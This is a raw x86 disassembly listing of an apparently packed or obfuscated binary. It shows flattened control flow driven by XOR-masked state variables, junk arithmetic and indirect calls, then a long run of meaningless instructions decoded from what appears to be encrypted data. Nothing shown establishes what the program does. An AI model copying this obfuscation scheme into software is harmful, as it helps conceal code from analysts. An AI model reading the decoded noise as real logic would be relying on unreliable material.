  41c489:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c490:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c497:	mov    DWORD PTR ds:0x42a000,0x393
  41c4a1:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c4a8:	movzx  ecx,WORD PTR ds:0x42a008
  41c4af:	mov    ecx,DWORD PTR [ebp-0xc]
  41c4b2:	mov    DWORD PTR [ebp+0x8],ecx
  41c4b5:	jmp    0x41c6f7
  41c4ba:	mov    ecx,DWORD PTR ds:0x428024
  41c4c0:	add    DWORD PTR ds:0x429008,ecx
  41c4c6:	mov    ecx,DWORD PTR [ebp+0x8]
  41c4c9:	sbb    edx,DWORD PTR ds:0x429018
  41c4cf:	mov    edx,DWORD PTR [ebp-0x8]
  41c4d2:	or     DWORD PTR ds:0x429010,0x42a010
  41c4dc:	xor    ecx,eax
  41c4de:	xor    edx,eax
  41c4e0:	adc    DWORD PTR ds:0x42a014,0x429000
  41c4ea:	sub    ecx,edx
  41c4ec:	adc    edx,DWORD PTR ds:0x42b010
  41c4f2:	sub    ecx,esi
  41c4f4:	mov    DWORD PTR ds:0x428018,0x60a2
  41c4fe:	xor    ecx,eax
  41c500:	mov    DWORD PTR [ebp+0x8],ecx
  41c503:	and    ecx,0x319e
  41c509:	mov    ecx,DWORD PTR [ebp+0x8]
  41c50c:	or     edx,DWORD PTR ds:0x428008
  41c512:	mov    edx,DWORD PTR [ebp-0x64]
  41c515:	lea    ecx,[edx+ecx*1+0x5708f5]
  41c51c:	mov    DWORD PTR [ebp-0x64],ecx
  41c51f:	or     DWORD PTR ds:0x42901c,0xdce
  41c529:	mov    ecx,DWORD PTR [ebp+0x8]
  41c52c:	movzx  edx,BYTE PTR ds:0x429000
  41c533:	xor    DWORD PTR ds:0x42c004,edx
  41c539:	mov    edx,DWORD PTR [ebp-0x60]
  41c53c:	lea    ecx,[edx+ecx*1+0x5708f5]
  41c543:	not    edx
  41c545:	mov    DWORD PTR [ebp-0x60],ecx
  41c548:	xor    ecx,ecx
  41c54a:	or     ecx,DWORD PTR ds:0x428008
  41c550:	adc    ecx,DWORD PTR ds:0x42901c
  41c556:	mov    DWORD PTR ds:0x428008,ecx
  41c55c:	mov    ecx,DWORD PTR [ebp+0x8]
  41c55f:	and    DWORD PTR ds:0x42b018,0x0
  41c569:	mov    edx,DWORD PTR ds:0x42b018
  41c56f:	inc    edx
  41c570:	mov    DWORD PTR ds:0x42b018,edx
  41c576:	cmp    DWORD PTR ds:0x42b018,0x1b
  41c57d:	jne    0x41c5ad
  41c583:	push   0x42c004
  41c588:	push   0x28d8
  41c58d:	push   0x39eb
  41c592:	push   0x42801c
  41c597:	push   0x11e7
  41c59c:	push   0x4234de
  41c5a1:	push   DWORD PTR [ebp-0x1c]
  41c5a4:	push   DWORD PTR [ebp-0x1c]
  41c5a7:	call   DWORD PTR ds:0x424024
  41c5ad:	cmp    DWORD PTR ds:0x42b018,0x17
  41c5b4:	jb     0x41c569
  41c5ba:	or     DWORD PTR ds:0x42a018,0x7d26
  41c5c4:	mov    edx,DWORD PTR [ebp-0x5c]
  41c5c7:	sbb    DWORD PTR ds:0x42c008,0x428018
  41c5d1:	lea    ecx,[edx+ecx*1+0x5708f4]
  41c5d8:	and    DWORD PTR ds:0x42c00c,edx
  41c5de:	mov    DWORD PTR [ebp-0x5c],ecx
  41c5e1:	and    edx,0x6d7b
  41c5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ea:	mov    edx,DWORD PTR [ebp-0x58]
  41c5ed:	mov    DWORD PTR ds:0x428028,0xea2
  41c5f7:	lea    ecx,[edx+ecx*1+0x5708fb]
  41c5fe:	mov    DWORD PTR [ebp-0x58],ecx
  41c601:	mov    DWORD PTR ds:0x429010,0x14
  41c60b:	cmp    DWORD PTR ds:0x429010,0x0
  41c612:	je     0x41c6a5
  41c618:	cmp    DWORD PTR ds:0x429010,0x4
  41c61f:	jne    0x41c636
  41c625:	push   0x3e6d
  41c62a:	push   DWORD PTR [ebp-0x28]
  41c62d:	push   DWORD PTR [ebp-0x10]
  41c630:	call   DWORD PTR ds:0x424028
  41c636:	cmp    DWORD PTR ds:0x429010,0x5
  41c63d:	jne    0x41c652
  41c643:	xor    edx,edx
  41c645:	add    edx,DWORD PTR ds:0x429010
  41c64b:	dec    edx
  41c64c:	mov    DWORD PTR ds:0x429010,edx
  41c652:	mov    edx,DWORD PTR ds:0x429010
  41c658:	dec    edx
  41c659:	mov    DWORD PTR ds:0x429010,edx
  41c65f:	jmp    0x41c60b
  41c664:	and    DWORD PTR ds:0x428018,0x0
  41c66e:	mov    edx,DWORD PTR ds:0x428018
  41c674:	inc    edx
  41c675:	mov    DWORD PTR ds:0x428018,edx
  41c67b:	cmp    DWORD PTR ds:0x428018,0x20
  41c682:	jne    0x41c698
  41c688:	push   0x4235ed
  41c68d:	push   0x423604
  41c692:	call   DWORD PTR ds:0x424030
  41c698:	cmp    DWORD PTR ds:0x428018,0x19
  41c69f:	jb     0x41c66e
  41c6a5:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6a8:	mov    edx,DWORD PTR [ebp-0x54]
  41c6ab:	adc    DWORD PTR ds:0x429000,0x42b000
  41c6b5:	lea    ecx,[edx+ecx*1+0x5708fa]
  41c6bc:	mov    DWORD PTR [ebp-0x54],ecx
  41c6bf:	not    edx
  41c6c1:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6c4:	mov    edx,DWORD PTR ds:0x42901c
  41c6ca:	and    edx,DWORD PTR ds:0x42c004
  41c6d0:	mov    DWORD PTR ds:0x42901c,edx
  41c6d6:	mov    edx,DWORD PTR [ebp-0x50]
  41c6d9:	sbb    DWORD PTR ds:0x428010,0x6c9
  41c6e3:	lea    ecx,[edx+ecx*1+0x5708f9]
  41c6ea:	or     DWORD PTR ds:0x42c018,0x5b89
  41c6f4:	mov    DWORD PTR [ebp-0x50],ecx
  41c6f7:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6fa:	xor    DWORD PTR ds:0x42c000,0x390a
  41c704:	xor    ecx,eax
  41c706:	sbb    DWORD PTR ds:0x428020,0x44b0
  41c710:	add    ecx,esi
  41c712:	jne    0x41c4ba
  41c718:	jmp    0x41ed36
  41c71d:	xor    edx,edx
  41c71f:	add    edx,DWORD PTR ds:0x42176a
  41c725:	mov    ecx,DWORD PTR ds:0x4234ca
  41c72b:	sub    ecx,edx
  41c72d:	and    edx,DWORD PTR [edx+ecx*1]
  41c730:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c733:	sub    DWORD PTR ds:0x42b00c,0x42a008
  41c73d:	mov    edx,DWORD PTR [ebp-0x8]
  41c740:	xor    ecx,eax
  41c742:	or     DWORD PTR ds:0x42c014,0x2e7c
  41c74c:	xor    edx,eax
  41c74e:	sub    ecx,edx
  41c750:	sub    ecx,esi
  41c752:	xor    ecx,eax
  41c754:	mov    DWORD PTR [ebp-0x1c],ecx
  41c757:	mov    ecx,0x464b
  41c75c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c75f:	mov    DWORD PTR [ebp+0x8],ecx
  41c762:	jmp    0x41c827
  41c767:	and    DWORD PTR ds:0x42a008,0x0
  41c771:	jmp    0x41c783
  41c776:	mov    edi,DWORD PTR ds:0x42a008
  41c77c:	inc    edi
  41c77d:	mov    DWORD PTR ds:0x42a008,edi
  41c783:	cmp    DWORD PTR ds:0x42a008,0x11
  41c78a:	jae    0x41c7ee
  41c790:	cmp    DWORD PTR ds:0x42a008,0x6
  41c797:	jne    0x41c7b9
  41c79d:	push   DWORD PTR [ebp-0x14]
  41c7a0:	push   DWORD PTR [ebp-0x18]
  41c7a3:	push   DWORD PTR [ebp-0x10]
  41c7a6:	push   DWORD PTR [ebp-0x10]
  41c7a9:	push   0x7583
  41c7ae:	push   0x42b000
  41c7b3:	call   DWORD PTR ds:0x424038
  41c7b9:	cmp    DWORD PTR ds:0x42a008,0x5
  41c7c0:	jne    0x41c7d5
  41c7c6:	xor    edi,edi
  41c7c8:	or     edi,DWORD PTR ds:0x42a008
  41c7ce:	inc    edi
  41c7cf:	mov    DWORD PTR ds:0x42a008,edi
  41c7d5:	jmp    0x41c776
  41c7da:	xor    ecx,ecx
  41c7dc:	add    ecx,DWORD PTR ds:0x42b000
  41c7e2:	adc    ecx,DWORD PTR ds:0x42b008
  41c7e8:	mov    DWORD PTR ds:0x42b000,ecx
  41c7ee:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7f1:	mov    edx,DWORD PTR ds:0x42c018
  41c7f7:	sbb    DWORD PTR ds:0x42a01c,edx
  41c7fd:	mov    edx,DWORD PTR [ebp-0x8]
  41c800:	xor    ecx,eax
  41c802:	xor    edx,eax
  41c804:	sub    ecx,edx
  41c806:	sub    ecx,esi
  41c808:	xor    ecx,eax
  41c80a:	mov    DWORD PTR [ebp+0x8],ecx
  41c80d:	mov    ecx,DWORD PTR [ebp+0x8]
  41c810:	mov    edx,DWORD PTR [ebp+0x8]
  41c813:	imul   edx,edx,0x5708f5
  41c819:	xor    ecx,eax
  41c81b:	add    ecx,esi
  41c81d:	lea    ecx,[ebp+ecx*4-0x64]
  41c821:	mov    edi,DWORD PTR [ecx]
  41c823:	add    edx,edi
  41c825:	mov    DWORD PTR [ecx],edx
  41c827:	mov    ecx,DWORD PTR [ebp+0x8]
  41c82a:	xor    ecx,eax
  41c82c:	add    ecx,esi
  41c82e:	jne    0x41c767
  41c834:	mov    ecx,DWORD PTR [ebp-0x20]
  41c837:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41c83e:	mov    dl,BYTE PTR [ebp-0x1]
  41c841:	cmp    cl,dl
  41c843:	je     0x41c91c
  41c849:	mov    ecx,DWORD PTR [ebp-0x20]
  41c84c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41c853:	mov    edx,DWORD PTR [ebp+0xc]
  41c856:	cmp    cl,BYTE PTR [edx]
  41c858:	jne    0x41ed48
  41c85e:	mov    ecx,DWORD PTR [ebp-0x14]
  41c861:	mov    edx,DWORD PTR [ebp+0xc]
  41c864:	movsx  edx,BYTE PTR [edx]
  41c867:	xor    ecx,eax
  41c869:	add    ecx,esi
  41c86b:	cmp    edx,ecx
  41c86d:	mov    ecx,DWORD PTR [ebp-0xc]
  41c870:	mov    DWORD PTR [ebp+0x8],ecx
  41c873:	mov    ecx,DWORD PTR [ebp+0x8]
  41c876:	je     0x42113d
  41c87c:	jmp    0x41c8b1
  41c881:	mov    ecx,DWORD PTR [ebp+0x8]
  41c884:	mov    edx,DWORD PTR [ebp-0x8]
  41c887:	xor    ecx,eax
  41c889:	xor    edx,eax
  41c88b:	sub    ecx,edx
  41c88d:	sub    ecx,esi
  41c88f:	xor    ecx,eax
  41c891:	mov    DWORD PTR [ebp+0x8],ecx
  41c894:	mov    ecx,DWORD PTR [ebp+0x8]
  41c897:	mov    edx,DWORD PTR [ebp+0x8]
  41c89a:	xor    ecx,eax
  41c89c:	imul   edx,edx,0x5708f5
  41c8a2:	add    ecx,esi
  41c8a4:	lea    ecx,[ebp+ecx*4-0x64]
  41c8a8:	mov    edi,DWORD PTR [ecx]
  41c8aa:	add    edx,edi
  41c8ac:	mov    DWORD PTR [ecx],edx
  41c8ae:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8b1:	xor    ecx,eax
  41c8b3:	add    ecx,esi
  41c8b5:	jne    0x41c881
  41c8bb:	mov    ecx,DWORD PTR [ebp-0x14]
  41c8be:	mov    edx,DWORD PTR [ebp+0x8]
  41c8c1:	xor    ecx,eax
  41c8c3:	xor    edx,eax
  41c8c5:	add    ecx,esi
  41c8c7:	add    edx,esi
  41c8c9:	cmp    ecx,edx
  41c8cb:	jae    0x41c961
  41c8d1:	lea    edx,[ecx-0x3272db]
  41c8d7:	mov    DWORD PTR [ebp-0x18],edx
  41c8da:	mov    edi,DWORD PTR [ebp-0x18]
  41c8dd:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41c8e4:	lea    edx,[ebp-0x24]
  41c8e7:	mov    DWORD PTR [ebp-0x10],edx
  41c8ea:	mov    edx,DWORD PTR [ebp-0x10]
  41c8ed:	add    DWORD PTR [edx],0x705fa08
  41c8f3:	mov    ebx,DWORD PTR [ebp-0x10]
  41c8f6:	xor    edi,eax
  41c8f8:	add    edi,DWORD PTR [ebx]
  41c8fa:	lea    edx,[ebp+ecx*4-0x64]
  41c8fe:	mov    ebx,DWORD PTR [edx]
  41c900:	xor    edi,ebx
  41c902:	mov    DWORD PTR [edx],edi
  41c904:	mov    edx,DWORD PTR [ebp+0x8]
  41c907:	xor    edx,eax
  41c909:	inc    ecx
  41c90a:	inc    DWORD PTR [ebp-0x18]
  41c90d:	add    edx,esi
  41c90f:	cmp    ecx,edx
  41c911:	jb     0x41c8da
  41c917:	jmp    0x41c961
  41c91c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c91f:	mov    DWORD PTR [ebp+0x8],ecx
  41c922:	jmp    0x41c954
  41c927:	mov    ecx,DWORD PTR [ebp+0x8]
  41c92a:	mov    edx,DWORD PTR [ebp-0x8]
  41c92d:	xor    ecx,eax
  41c92f:	xor    edx,eax
  41c931:	sub    ecx,edx
  41c933:	sub    ecx,esi
  41c935:	xor    ecx,eax
  41c937:	mov    DWORD PTR [ebp+0x8],ecx
  41c93a:	mov    ecx,DWORD PTR [ebp+0x8]
  41c93d:	mov    edx,DWORD PTR [ebp+0x8]
  41c940:	imul   edx,edx,0x5708f5
  41c946:	xor    ecx,eax
  41c948:	add    ecx,esi
  41c94a:	lea    ecx,[ebp+ecx*4-0x64]
  41c94e:	mov    edi,DWORD PTR [ecx]
  41c950:	add    edx,edi
  41c952:	mov    DWORD PTR [ecx],edx
  41c954:	mov    ecx,DWORD PTR [ebp+0x8]
  41c957:	xor    ecx,eax
  41c959:	add    ecx,esi
  41c95b:	jne    0x41c927
  41c961:	mov    ecx,DWORD PTR [ebp-0xc]
  41c964:	mov    DWORD PTR [ebp+0x8],ecx
  41c967:	jmp    0x41ed14
  41c96c:	mov    ecx,DWORD PTR [ebp+0x8]
  41c96f:	mov    edx,DWORD PTR [ebp-0x8]
  41c972:	xor    ecx,eax
  41c974:	xor    edx,eax
  41c976:	sub    ecx,edx
  41c978:	jmp    0x41ecf3
  41c97d:	rcr    DWORD PTR [esi+0x158d36fd],1
  41c983:	imul   esp,DWORD PTR [ebp-0x6e],0x3780d858
  41c98a:	mov    ch,0x80
  41c98c:	push   ebx
  41c98d:	loope  0x41c98c
  41c98f:	popa   
  41c990:	bound  eax,QWORD PTR [edi+ebx*2]
  41c993:	bound  esp,QWORD PTR [edx+0x22]
  41c996:	popa   
  41c997:	push   0xffffffcf
  41c999:	inc    eax
  41c99a:	pop    edx
  41c99b:	scas   al,BYTE PTR es:[edi]
  41c99c:	pop    esp
  41c99d:	add    edx,esi
  41c99f:	ss xchg esi,eax
  41c9a1:	test   BYTE PTR [eax-0x33],0xde
  41c9a5:	jl     0x41ca04
  41c9a7:	add    al,0x6d
  41c9a9:	dec    edi
  41c9aa:	sar    BYTE PTR ds:[eax],cl
  41c9ad:	or     BYTE PTR [ecx+0x21004e5a],al
  41c9b3:	repz add al,bl
  41c9b6:	jo     0x41c974
  41c9b8:	cmp    bh,bl
  41c9ba:	xchg   edi,eax
  41c9bb:	(bad)  
  41c9bc:	push   edi
  41c9bd:	je     0x41c9c4
  41c9bf:	inc    edi
  41c9c0:	repnz mov ebp,0x5982090d
  41c9c6:	retf   
  41c9c7:	push   cs
  41c9c8:	inc    esi
  41c9c9:	popa   
  41c9ca:	call   eax
  41c9cc:	ret    
  41c9cd:	outs   dx,BYTE PTR ds:[esi]
  41c9ce:	pop    esp
  41c9cf:	adc    DWORD PTR [ecx],edx
  41c9d1:	and    ebx,DWORD PTR [esi-0x1d618c19]
  41c9d7:	push   ss
  41c9d8:	test   DWORD PTR [eax+0xe],edi
  41c9db:	rcr    BYTE PTR [ebp+0x4dfcf5b7],1
  41c9e1:	daa    
  41c9e2:	dec    ecx
  41c9e3:	call   0xa9a4:0x22c9ba33
  41c9ea:	cmp    dh,cl
  41c9ec:	pop    ebp
  41c9ed:	pop    esi
  41c9ee:	test   eax,0x45ee7577
  41c9f3:	and    ecx,edx
  41c9f5:	jnp    0x41ca0f
  41c9f7:	pushf  
  41c9f8:	aaa    
  41c9f9:	ror    BYTE PTR [esi+0x38ada5a5],1
  41c9ff:	retf   0x24
  41ca02:	pop    edx
  41ca03:	inc    esi
  41ca04:	or     DWORD PTR [edi+eax*2+0x1536cf4f],0x46
  41ca0c:	fs ret 0x8123
  41ca10:	ins    DWORD PTR es:[edi],dx
  41ca11:	test   al,0xfd
  41ca13:	int3   
  41ca14:	cmp    dl,BYTE PTR [edx-0x225c73b]
  41ca1a:	dec    esp
  41ca1b:	push   ss
  41ca1c:	sub    DWORD PTR [ecx+0x76714f99],ebp
  41ca22:	lea    eax,[edi]
  41ca24:	pop    edx
  41ca25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca26:	lods   al,BYTE PTR ds:[esi]
  41ca27:	xor    bl,0xf3
  41ca2a:	daa    
  41ca2b:	loop   0x41ca03
  41ca2d:	inc    ebp
  41ca2e:	outs   dx,DWORD PTR ds:[esi]
  41ca2f:	lods   eax,DWORD PTR ds:[esi]
  41ca30:	mov    WORD PTR [edi-0x33],ss
  41ca33:	jecxz  0x41ca57
  41ca35:	xor    edx,DWORD PTR [eax]
  41ca37:	pop    es
  41ca38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca39:	mov    ds:0xbc6fe9d0,eax
  41ca3e:	outs   dx,BYTE PTR ds:[esi]
  41ca3f:	clc    
  41ca40:	scas   eax,DWORD PTR es:[edi]
  41ca41:	jbe    0x41ca37
  41ca43:	and    ebp,DWORD PTR [edx-0x40]
  41ca46:	inc    ebx
  41ca47:	dec    ebp
  41ca48:	mov    esi,0xa152a3b7
  41ca4d:	mov    cl,0xa4
  41ca4f:	retf   0x8f8b
  41ca52:	loope  0x41c9e1
  41ca54:	mov    dl,0x34
  41ca56:	mov    eax,0xf34d6c7f
  41ca5b:	inc    esi
  41ca5c:	popf   
  41ca5d:	cmc    
  41ca5e:	xchg   ebx,eax
  41ca5f:	mov    esp,0x7e344092
  41ca64:	push   eax
  41ca65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca66:	xchg   ebp,eax
  41ca67:	jnp    0x41ca64
  41ca69:	adc    ebp,DWORD PTR [edi+0x21]
  41ca6c:	and    DWORD PTR [eax+0x7cc522e5],esi
  41ca72:	push   esp
  41ca73:	sbb    eax,esp
  41ca75:	mov    edx,0x2158c066
  41ca7a:	inc    esi
  41ca7b:	ret    0x678d
  41ca7e:	inc    cx
  41ca80:	leave  
  41ca81:	sbb    ah,bl
  41ca83:	sbb    BYTE PTR [ecx-0x435c473b],ch
  41ca89:	pop    eax
  41ca8a:	arpl   bx,cx
  41ca8c:	mov    al,bh
  41ca8e:	dec    eax
  41ca8f:	in     eax,dx
  41ca90:	ins    BYTE PTR es:[edi],dx
  41ca91:	aam    0x68
  41ca93:	jne    0x41ca74
  41ca95:	jp     0x41cabd
  41ca97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca98:	sbb    DWORD PTR [ebp+0x5c],edx
  41ca9b:	xor    al,0xd8
  41ca9d:	pop    esp
  41ca9e:	out    dx,al
  41ca9f:	inc    ebp
  41caa0:	push   ecx
  41caa1:	repz jecxz 0x41ca68
  41caa4:	adc    esi,DWORD PTR [edx]
  41caa6:	sbb    DWORD PTR [esp+ebx*8+0x2e5ce1f2],0xffffffa6
  41caae:	bound  ebx,QWORD PTR [esi+0x2f]
  41cab1:	mov    ?,WORD PTR [ebx]
  41cab3:	aam    0x2
  41cab5:	dec    ebx
  41cab6:	adc    bh,al
  41cab8:	or     dh,bl
  41caba:	mov    ecx,0xc1b833d
  41cabf:	sub    BYTE PTR [eax],ah
  41cac1:	ror    BYTE PTR [edx+0x5f59810d],cl
  41cac7:	fistp  WORD PTR [ebx-0x3e432314]
  41cacd:	ret    
  41cace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cacf:	stos   DWORD PTR es:[edi],eax
  41cad0:	shr    BYTE PTR [esi],cl
  41cad2:	sti    
  41cad3:	mov    ?,WORD PTR ds:0x5dee1967
  41cad9:	(bad)  
  41cada:	fldcw  WORD PTR [esi-0x6d]
  41cadd:	jle    0x41cada
  41cadf:	(bad)  
  41cae0:	dec    edi
  41cae1:	iret   
  41cae2:	pop    esi
  41cae3:	call   0xf458:0xe5504c2a
  41caea:	and    al,0x3b
  41caec:	sti    
  41caed:	loopne 0x41cb12
  41caef:	mov    esp,0x8ce00d36
  41caf4:	call   0xd97a:0x1d5ec887
  41cafb:	pop    esp
  41cafc:	lds    esi,FWORD PTR [esi-0x1c89a7f7]
  41cb02:	pop    esp
  41cb03:	dec    esp
  41cb04:	inc    ebx
  41cb05:	test   eax,0xf2886f14
  41cb0a:	mov    ebp,0x1f9f185c
  41cb0f:	das    
  41cb10:	cmc    
  41cb11:	mov    ebp,0x34fd792
  41cb16:	push   esi
  41cb17:	jnp    0x41cadd
  41cb19:	in     eax,dx
  41cb1a:	xor    dh,BYTE PTR [edi-0x24]
  41cb1d:	sub    cl,BYTE PTR [eax]
  41cb1f:	stos   BYTE PTR es:[edi],al
  41cb20:	aam    0x8d
  41cb22:	xchg   ebp,eax
  41cb23:	cmp    ebx,eax
  41cb25:	or     dl,bh
  41cb27:	and    eax,0x1102fe85
  41cb2c:	into   
  41cb2d:	xchg   BYTE PTR [edx+0x52ebf32a],bl
  41cb33:	into   
  41cb34:	sub    al,0x9a
  41cb36:	and    ebp,edx
  41cb38:	data16 jno 0x41cafb
  41cb3b:	ds hlt 
  41cb3d:	xchg   ebp,eax
  41cb3e:	aam    0x5f
  41cb40:	mov    eax,ds:0x84846b0d
  41cb45:	mov    cl,0x8e
  41cb47:	ficom  WORD PTR [edx+0x57]
  41cb4a:	add    BYTE PTR [edx],dl
  41cb4c:	mov    bh,0xc7
  41cb4e:	or     esi,DWORD PTR ds:0x71155d07
  41cb54:	pop    ecx
  41cb55:	scas   al,BYTE PTR es:[edi]
  41cb56:	aas    
  41cb57:	retf   0x7cc7
  41cb5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb5b:	xchg   esi,eax
  41cb5c:	(bad)  
  41cb5d:	pop    eax
  41cb5e:	hlt    
  41cb5f:	mov    al,ds:0xd9989741
  41cb64:	mov    ?,WORD PTR [ebx+0x70beeb74]
  41cb6a:	dec    esi
  41cb6b:	jge    0x41cb74
  41cb6d:	jecxz  0x41cb1f
  41cb6f:	das    
  41cb70:	int    0xc4
  41cb72:	pop    ebp
  41cb73:	xchg   esp,eax
  41cb74:	into   
  41cb75:	int    0x37
  41cb77:	mov    DWORD PTR [ebp+0x64207dfb],edx
  41cb7d:	wrmsr  
  41cb7f:	add    al,0x1e
  41cb81:	jnp    0x41cb24
  41cb83:	loop   0x41cb2f
  41cb85:	test   eax,0x77bafc93
  41cb8a:	retf   
  41cb8b:	stos   BYTE PTR es:[edi],al
  41cb8c:	and    esp,edi
  41cb8e:	sub    cl,BYTE PTR ds:0xd5a0b525
  41cb94:	scas   eax,DWORD PTR es:[edi]
  41cb95:	mov    esp,0xba02b723
  41cb9a:	mov    eax,0xc114e088
  41cb9f:	jl     0x41cb75
  41cba1:	sbb    bl,dh
  41cba3:	xchg   edx,eax
  41cba4:	push   0xdf080a79
  41cba9:	mov    ebp,0x62f3b2cf
  41cbae:	xchg   BYTE PTR [edx],ch
  41cbb0:	add    DWORD PTR [eax],0x36
  41cbb3:	pop    ebp
  41cbb4:	popf   
  41cbb5:	call   0xf2ad141
  41cbba:	jmp    0x41cb44
  41cbbc:	push   ebp
  41cbbd:	sbb    ebx,DWORD PTR [edx+0x2f3aa6e8]
  41cbc3:	push   0xee1a573d
  41cbc8:	popf   
  41cbc9:	cmc    
  41cbca:	mov    al,0x5e
  41cbcc:	add    DWORD PTR [edx-0x5d],esi
  41cbcf:	add    DWORD PTR [ebp-0x7a],ebx
  41cbd2:	rcr    BYTE PTR [eax],cl
  41cbd4:	adc    ch,BYTE PTR [eax]
  41cbd6:	cmp    al,0x30
  41cbd8:	jo     0x41cb8e
  41cbda:	push   esp
  41cbdb:	iret   
  41cbdc:	adc    eax,0xcc58a3cb
  41cbe1:	mov    ds:0xb45652e4,al
  41cbe6:	pop    edx
  41cbe7:	push   esi
  41cbe8:	push   ebp
  41cbe9:	inc    ebp
  41cbea:	popa   
  41cbeb:	dec    ebx
  41cbec:	xchg   ebx,eax
  41cbed:	cdq    
  41cbee:	repnz out dx,eax
  41cbf0:	lahf   
  41cbf1:	js     0x41cb7e
  41cbf3:	mov    eax,ds:0xeeb50db7
  41cbf8:	cli    
  41cbf9:	inc    edx
  41cbfa:	sbb    BYTE PTR [ecx],dl
  41cbfc:	retf   
  41cbfd:	adc    eax,0x2d632a33
  41cc02:	frstor [edi+0x6cfcf668]
  41cc08:	mov    al,fs:0x12f03fe0
  41cc0e:	push   edx
  41cc0f:	jp     0x41cba4
  41cc11:	ffree  st(4)
  41cc13:	dec    bh
  41cc15:	(bad)  
  41cc16:	jle    0x41cc96
  41cc18:	add    eax,0x98849c9e
  41cc1d:	push   edx
  41cc1e:	xor    BYTE PTR [eax],dh
  41cc20:	xor    ch,BYTE PTR ss:[edi]
  41cc23:	mov    ebx,0x12c4dae4
  41cc28:	sbb    ecx,esi
  41cc2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc2b:	imul   cx,WORD PTR [esi],0xb5ef
  41cc30:	loope  0x41cc84
  41cc32:	test   eax,0x862912d3
  41cc37:	aam    0xa6
  41cc39:	ins    BYTE PTR es:[edi],dx
  41cc3a:	fwait
  41cc3b:	jb     0x41cc78
  41cc3d:	pushf  
  41cc3e:	pop    esi
  41cc3f:	gs sti 
  41cc41:	inc    edi
  41cc42:	mov    eax,edi
  41cc44:	je     0x41cc71
  41cc46:	or     edi,DWORD PTR [esi+0x7da2467]
  41cc4c:	shr    bl,cl
  41cc4e:	push   ebx
  41cc4f:	std    
  41cc50:	into   
  41cc51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc52:	fistp  WORD PTR [eax-0x4a]
  41cc55:	inc    ebp
  41cc56:	(bad)  [ebp-0x5e76c87d]
  41cc5c:	inc    edx
  41cc5d:	push   ebx
  41cc5e:	and    cl,cl
  41cc60:	cmp    DWORD PTR [edi],ebx
  41cc62:	inc    edi
  41cc63:	sbb    al,0x90
  41cc65:	gs stos BYTE PTR es:[edi],al
  41cc67:	prefetch (bad)
  41cc68:	or     eax,0x47d29df1
  41cc6d:	lods   eax,DWORD PTR ds:[esi]
  41cc6e:	push   DWORD PTR [edx+0x67a8ed19]
  41cc74:	fwait
  41cc75:	push   0x5b1d021d
  41cc7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc7b:	sbb    DWORD PTR [edi+0x7c],0xffffff8f
  41cc7f:	push   edi
  41cc80:	sub    eax,0x2d58df0
  41cc85:	popa   
  41cc86:	inc    esi
  41cc87:	push   edx
  41cc88:	jns    0x41cc2a
  41cc8a:	mov    dh,BYTE PTR [eax-0x3e]
  41cc8d:	sub    bh,BYTE PTR [ebp+0x46]
  41cc90:	inc    eax
  41cc91:	xor    DWORD PTR [ecx-0xc],ecx
  41cc94:	mov    bh,0xfe
  41cc96:	pop    esp
  41cc97:	lea    eax,[edx]
  41cc99:	mov    eax,ds:0xa429021b
  41cc9e:	or     eax,0x67e0112
  41cca3:	inc    esi
  41cca4:	pop    esi
  41cca5:	in     eax,0xeb
  41cca7:	jmp    0x41cc3f
  41cca9:	adc    esi,DWORD PTR [ecx+edi*8-0x24f55036]
  41ccb0:	xchg   ebp,eax
  41ccb1:	or     eax,0x4e5fa05e
  41ccb6:	push   eax
  41ccb7:	dec    edi
  41ccb8:	(bad)  
  41ccb9:	jns    0x41ccd2
  41ccbb:	mov    ebx,0x6bc16f77
  41ccc0:	repz inc esi
  41ccc2:	jle    0x41ccb8
  41ccc4:	cmp    ecx,ecx
  41ccc6:	cmp    DWORD PTR [edi+edi*4+0x1e],0xffffffd8
  41cccb:	mov    al,0x87
  41cccd:	loope  0x41cd3a
  41cccf:	test   al,0xf7
  41ccd1:	aad    0x1f
  41ccd3:	mov    eax,ds:0x3ef00b
  41ccd8:	push   esp
  41ccd9:	ss sub esp,ebp
  41ccdc:	nop
  41ccdd:	les    edx,FWORD PTR [edx-0x4c]
  41cce0:	ss pop esp
  41cce2:	add    eax,0x75c6ce36
  41cce7:	neg    DWORD PTR [esi-0x51]
  41ccea:	daa    
  41cceb:	in     al,0xf4
  41cced:	fisttp DWORD PTR [ebp-0x3e]
  41ccf0:	jmp    0x41cc7a
  41ccf2:	cli    
  41ccf3:	in     eax,dx
  41ccf4:	jo     0x41ccbc
  41ccf6:	test   dl,0x79
  41ccf9:	sub    al,0xe9
  41ccfb:	leave  
  41ccfc:	jo     0x41cc84
  41ccfe:	adc    ch,ah
  41cd00:	jmp    0x41cd00
  41cd02:	enter  0x2079,0xd5
  41cd06:	aaa    
  41cd07:	mov    esp,0xb372316c
  41cd0c:	outs   dx,DWORD PTR ds:[esi]
  41cd0d:	jbe    0x41ccbd
  41cd0f:	scas   eax,DWORD PTR es:[edi]
  41cd10:	call   0xb928aec6
  41cd15:	rol    BYTE PTR [esi],0xc9
  41cd18:	jo     0x41cccc
  41cd1a:	push   edx
  41cd1b:	dec    ebp
  41cd1c:	in     al,dx
  41cd1d:	xchg   ecx,eax
  41cd1e:	push   ds
